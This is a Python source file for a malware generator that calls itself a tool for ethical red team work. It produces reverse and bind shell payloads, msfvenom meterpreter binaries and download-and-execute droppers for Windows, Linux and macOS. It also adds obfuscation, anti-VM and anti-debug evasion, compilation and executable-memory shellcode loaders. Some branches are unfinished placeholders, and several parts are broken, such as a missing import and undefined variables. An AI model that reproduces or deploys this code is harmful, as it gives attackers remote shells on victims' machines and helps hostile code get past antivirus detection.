# core/malware_generator.py
import os
import subprocess
import base64
import random
import string
from typing import Dict, List, Optional
import logging
from cryptography.fernet import Fernet
import hashlib
import struct

class MalwareGenerator:
    """Custom malware generator for ethical red team operations"""
    
    def __init__(self):
        self.logger = logging.getLogger("MalwareGenerator")
        self.templates_dir = os.path.join(os.path.dirname(__file__), 'templates')
        self.supported_platforms = ['windows', 'linux', 'macos']
        self.supported_payloads = ['reverse_shell', 'bind_shell', 'meterpreter', 'command_exec', 'file_download']
        self.obfuscation_techniques = ['xor', 'base64', 'aes', 'polymorphic', 'metamorphic']
        
    def generate(self, 
                platform: str, 
                payload_type: str, 
                config: Dict,
                obfuscation: Optional[List[str]] = None) -> Dict:
        """Generate custom malware based on requirements"""
        
        if platform not in self.supported_platforms:
            return {'error': f'Unsupported platform: {platform}'}
        
        if payload_type not in self.supported_payloads:
            return {'error': f'Unsupported payload type: {payload_type}'}
        
        # Generate payload
        payload_code = self._generate_payload(platform, payload_type, config)
        
        # Apply obfuscation
        if obfuscation:
            for technique in obfuscation:
                if technique in self.obfuscation_techniques:
                    payload_code = self._apply_obfuscation(payload_code, technique)
        
        # Apply evasion techniques
        payload_code = self._apply_evasion(payload_code, platform)
        
        # Compile if necessary
        if platform in ['windows', 'linux']:
            binary_path = self._compile_payload(payload_code, platform)
        else:
            binary_path = None
        
        # Generate loader/dropper
        loader_code = self._generate_loader(payload_code, platform)
        
        # Create polymorphic wrapper
        wrapped_payload = self._create_polymorphic_wrapper(payload_code)
        
        return {
            'success': True,
            'platform': platform,
            'payload_type': payload_type,
            'obfuscation': obfuscation,
            'payload_code': payload_code,
            'loader_code': loader_code,
            'binary_path': binary_path,
            'wrapped_payload': wrapped_payload,
            'metadata': self._generate_metadata(platform, payload_type, config)
        }
    
    def _generate_payload(self, platform: str, payload_type: str, config: Dict) -> str:
        """Generate raw payload code"""
        if payload_type == 'reverse_shell':
            return self._generate_reverse_shell(platform, config)
        elif payload_type == 'bind_shell':
            return self._generate_bind_shell(platform, config)
        elif payload_type == 'meterpreter':
            return self._generate_meterpreter(platform, config)
        elif payload_type == 'command_exec':
            return self._generate_command_exec(platform, config)
        elif payload_type == 'file_download':
            return self._generate_file_download(platform, config)
        else:
            return ''
    
    def _generate_reverse_shell(self, platform: str, config: Dict) -> str:
        """Generate reverse shell payload"""
        ip = config.get('lhost', '127.0.0.1')
        port = config.get('lport', 4444)
        
        if platform == 'windows':
            return f"""
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

int main() {{
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    WSAStartup(MAKEWORD(2,2), &wsaData);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("{ip}");
    server.sin_port = htons({port});
    
    WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL);
    
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    return 0;
}}
"""
        elif platform == 'linux':
            return f"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {{
    int sock;
    struct sockaddr_in server;
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("{ip}");
    server.sin_port = htons({port});
    
    connect(sock, (struct sockaddr *)&server, sizeof(server));
    
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    
    execve("/bin/sh", NULL, NULL);
    return 0;
}}
"""
        elif platform == 'macos':
            return f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""
        return ''
    
    def _generate_bind_shell(self, platform: str, config: Dict) -> str:
        """Generate bind shell payload"""
        port = config.get('lport', 4444)
        
        if platform == 'windows':
            return f"""
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "Ws2_32.lib")

int main() {{
    WSADATA wsaData;
    SOCKET serverSocket, clientSocket;
    struct sockaddr_in server, client;
    int c;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    WSAStartup(MAKEWORD(2,2), &wsaData);
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons({port});
    
    bind(serverSocket, (struct sockaddr *)&server, sizeof(server));
    listen(serverSocket, 3);
    
    c = sizeof(struct sockaddr_in);
    clientSocket = accept(serverSocket, (struct sockaddr *)&client, &c);
    
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)clientSocket;
    
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    return 0;
}}
"""
        elif platform == 'linux':
            return f"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main() {{
    int serverSocket, clientSocket;
    struct sockaddr_in server, client;
    socklen_t c;
    
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons({port});
    
    bind(serverSocket, (struct sockaddr *)&server, sizeof(server));
    listen(serverSocket, 3);
    
    c = sizeof(struct sockaddr_in);
    clientSocket = accept(serverSocket, (struct sockaddr *)&client, &c);
    
    dup2(clientSocket, 0);
    dup2(clientSocket, 1);
    dup2(clientSocket, 2);
    
    execve("/bin/sh", NULL, NULL);
    return 0;
}}
"""
        return ''
    
    def _generate_meterpreter(self, platform: str, config: Dict) -> str:
        """Generate meterpreter payload using msfvenom"""
        ip = config.get('lhost', '127.0.0.1')
        port = config.get('lport', 4444)
        
        if platform == 'windows':
            payload_name = 'windows/meterpreter/reverse_tcp'
            format = 'exe'
        elif platform == 'linux':
            payload_name = 'linux/x64/meterpreter/reverse_tcp'
            format = 'elf'
        else:
            return ''
        
        # Use msfvenom to generate payload
        command = [
            'msfvenom',
            '-p', payload_name,
            f'LHOST={ip}',
            f'LPORT={port}',
            '-f', format,
            '-o', f'meterpreter_{platform}.{format}'
        ]
        
        try:
            subprocess.run(command, check=True)
            with open(f'meterpreter_{platform}.{format}', 'rb') as f:
                payload_data = f.read()
            
            # Convert to hex string for embedding
            return ''.join(f'\\x{b:02x}' for b in payload_data)
        except:
            return ''
    
    def _generate_command_exec(self, platform: str, config: Dict) -> str:
        """Generate command execution payload"""
        command = config.get('command', 'whoami')
        
        if platform == 'windows':
            return f"""
#include <stdlib.h>
int main() {{
    system("{command}");
    return 0;
}}
"""
        elif platform == 'linux':
            return f"""
#include <stdlib.h>
int main() {{
    system("{command}");
    return 0;
}}
"""
        elif platform == 'macos':
            return f"""
import os
os.system("{command}")
"""
        return ''
    
    def _generate_file_download(self, platform: str, config: Dict) -> str:
        """Generate file download and execute payload"""
        url = config.get('url', '')
        output_file = config.get('output_file', 'downloaded_file')
        
        if platform == 'windows':
            return f"""
#include <windows.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

int main() {{
    URLDownloadToFile(NULL, "{url}", "{output_file}", 0, NULL);
    ShellExecute(NULL, "open", "{output_file}", NULL, NULL, SW_SHOW);
    return 0;
}}
"""
        elif platform == 'linux':
            return f"""
#include <stdlib.h>
int main() {{
    system("wget {url} -O {output_file} && chmod +x {output_file} && ./{output_file}");
    return 0;
}}
"""
        elif platform == 'macos':
            return f"""
import os
os.system("curl -o {output_file} {url} && chmod +x {output_file} && ./{output_file}")
"""
        return ''
    
    def _apply_obfuscation(self, code: str, technique: str) -> str:
        """Apply obfuscation to payload"""
        if technique == 'xor':
            key = random.randint(1, 255)
            obfuscated = ''.join(chr(ord(c) ^ key) for c in code)
            return f"""
char payload[] = {{{','.join(f'0x{ord(c):02x}' for c in obfuscated)}}};
int key = {key};
for (int i = 0; i < sizeof(payload); i++) payload[i] ^= key;
{code.split('\n')[0]}  // Include headers
int main() {{
    {code[code.find('int main() {') + len('int main() {'):]}
}}
"""
        
        elif technique == 'base64':
            encoded = base64.b64encode(code.encode()).decode()
            return f"""
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

const char* base64_payload = "{encoded}";

int main() {{
    // Base64 decoding logic would go here
    // For simplicity, this is a placeholder
    // The actual implementation would decode and execute
    return 0;
}}
"""
        
        elif technique == 'aes':
            # Generate random key and IV
            key = os.urandom(32)
            cipher = Fernet(base64.urlsafe_b64encode(key))
            encrypted = cipher.encrypt(code.encode())
            return f"""
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

const unsigned char encrypted_payload[] = {{{','.join(f'0x{b:02x}' for b in encrypted)}}};
const unsigned char key[] = {{{','.join(f'0x{b:02x}' for b in key)}}};

int main() {{
    // AES decryption logic would go here
    // For simplicity, this is a placeholder
    // The actual implementation would decrypt and execute
    return 0;
}}
"""
        
        elif technique == 'polymorphic':
            # Add random garbage instructions
            garbage_ops = [
                'int dummy = 0;',
                'char garbage[] = "random";',
                'float noise = 1.23;',
                'if (0) { printf("never"); }'
            ]
            
            lines = code.split('\n')
            for i in range(len(lines)):
                if random.random() < 0.3:  # 30% chance to add garbage
                    lines.insert(i, random.choice(garbage_ops))
            
            return '\n'.join(lines)
        
        elif technique == 'metamorphic':
            # Replace patterns with equivalent code
            replacements = {
                'return 0;': 'exit(0);',
                'printf(': 'fprintf(stdout, ',
                'malloc(': 'calloc(1, ',
                'if (': 'if( '
            }
            
            for pattern, replacement in replacements.items():
                code = code.replace(pattern, replacement)
            
            return code
        
        return code
    
    def _apply_evasion(self, code: str, platform: str) -> str:
        """Apply anti-detection evasion techniques"""
        if platform == 'windows':
            evasion_code = """
#include <windows.h>
// Anti-VM check
BOOL IsVirtualMachine() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    return (systemInfo.dwNumberOfProcessors < 2);
}

// Anti-debugging check
BOOL IsDebuggerPresent() {
    return *(PBOOL)(__readfsdword(0x30) + 2);
}
"""
            return evasion_code + '\n' + code
        
        elif platform == 'linux':
            evasion_code = """
#include <sys/ptrace.h>
#include <stdio.h>

// Anti-debugging check
int anti_debug() {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
        return 1;  // Debugger detected
    }
    return 0;
}
"""
            return evasion_code + '\n' + code
        
        return code
    
    def _compile_payload(self, code: str, platform: str) -> Optional[str]:
        """Compile payload to binary"""
        if platform == 'windows':
            source_file = 'payload.c'
            output_file = 'payload.exe'
            compiler = 'x86_64-w64-mingw32-gcc'
        elif platform == 'linux':
            source_file = 'payload.c'
            output_file = 'payload'
            compiler = 'gcc'
        else:
            return None
        
        try:
            with open(source_file, 'w') as f:
                f.write(code)
            
            subprocess.run([compiler, source_file, '-o', output_file], check=True)
            return output_file
        except:
            return None
    
    def _generate_loader(self, payload: str, platform: str) -> str:
        """Generate loader/dropper for payload"""
        # Base64 encode the payload for embedding
        encoded_payload = base64.b64encode(payload.encode()).decode()
        
        if platform == 'windows':
            return f"""
#include <windows.h>
#include <stdio.h>

const char* encoded_payload = "{encoded_payload}";

int main() {{
    // Decode payload
    // ... decoding logic ...
    
    // Allocate memory
    LPVOID addr = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Copy payload to allocated memory
    memcpy(addr, decoded_payload, payload_size);
    
    // Execute payload
    ((void(*)())addr)();
    
    return 0;
}}
"""
        
        elif platform == 'linux':
            return f"""
#include <sys/mman.h>
#include <string.h>
#include <stdio.h>

const char* encoded_payload = "{encoded_payload}";

int main() {{
    // Decode payload
    // ... decoding logic ...
    
    // Allocate executable memory
    void* addr = mmap(NULL, payload_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    // Copy payload to allocated memory
    memcpy(addr, decoded_payload, payload_size);
    
    // Execute payload
    ((void(*)())addr)();
    
    return 0;
}}
"""
        
        elif platform == 'macos':
            return f"""
import base64
import ctypes

encoded_payload = "{encoded_payload}"
decoded_payload = base64.b64decode(encoded_payload)

# Allocate executable memory and copy payload
shellcode = ctypes.create_string_buffer(decoded_payload)
function = ctypes.cast(shellcode, ctypes.CFUNCTYPE(None))
function()
"""
        
        return ''
    
    def _create_polymorphic_wrapper(self, payload: str) -> str:
        """Create polymorphic wrapper that changes each time"""
        # Generate random variable names
        var_names = [
            ''.join(random.choices(string.ascii_letters, k=8))
            for _ in range(5)
        ]
        
        # Generate random function names
        func_names = [
            ''.join(random.choices(string.ascii_letters, k=8))
            for _ in range(3)
        ]
        
        # Create wrapper with random structure
        wrapper = f"""
#include <stdio.h>
#include <stdlib.h>

int {func_names[0]}() {{
    // Dummy function
    return rand() % 100;
}}

void {func_names[1]}(int {var_names[0]}) {{
    // Another dummy function
    for (int {var_names[1]} = 0; {var_names[1]} < {var_names[0]}; {var_names[1]}++) {{
        printf("%d\\n", {var_names[1]});
    }}
}}

int main() {{
    int {var_names[2]} = {func_names[0]}();
    {func_names[1]}({var_names[2]});
    
    // Actual payload execution
    {payload}
    
    return 0;
}}
"""
        return wrapper
    
    def _generate_metadata(self, platform: str, payload_type: str, config: Dict) -> Dict:
        """Generate metadata for tracking and analysis"""
        return {
            'platform': platform,
            'payload_type': payload_type,
            'timestamp': int(time.time()),
            'config': config,
            'hash': hashlib.sha256(str(config).encode()).hexdigest(),
            'version': '1.0'
        }